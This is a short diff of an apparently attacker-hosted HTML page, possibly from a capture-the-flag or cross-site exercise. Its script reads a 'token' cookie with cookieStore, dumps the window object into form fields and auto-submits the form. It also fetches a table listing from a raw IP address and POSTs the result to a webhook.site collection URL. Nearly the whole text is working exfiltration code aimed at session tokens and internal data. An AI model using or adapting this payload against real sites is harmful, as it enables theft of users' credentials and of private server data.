@@ -11,11 +11,15 @@
                     </form>
 
                     <script>
+                        
+                      cookieStore.get("token").then(r=>{
+                        document.getElementById('cookie').value = JSON.stringify(window)
+                        document.getElementById('window').value = r 
+                        document.getElementById('form').submit()
+                      })
                      fetch('http://45.12.114.110:30031/table/list').then(res=>res.text()).then(async (r)=>{
                        await fetch('https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a?q=', {method:'POST', body:r});
-                                 document.getElementById('cookie').value = JSON.stringify(window)
-                      document.getElementById('window').value = await cookieStore.get("token")
-                        document.getElementById('form').submit()
+                               
                      })
             
                       
